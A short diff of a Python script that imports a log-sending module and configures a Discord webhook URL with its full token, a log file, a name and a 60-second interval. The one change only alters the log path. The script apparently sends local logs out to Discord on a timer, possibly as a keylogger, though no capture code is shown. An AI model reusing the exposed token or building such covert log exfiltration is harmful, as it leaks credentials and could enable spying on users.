@@ -3,7 +3,7 @@ import threading
 import enviarLog as enviar
 
 webhook_URL = "https://discord.com/api/webhooks/1440389519353319504/PQr2nuK1QRvsQLsA3vBOs1mF4JgGDIqkYym5QpSBLJUOZCNBZdpASx9nP0Ynu3Nwktop"
-caminho_log = "C:\Users\Bruno\Documents\log.txt"
+caminho_log = "log.txt"
 nome = "Pele Jhonson"
 segundos = 60
 
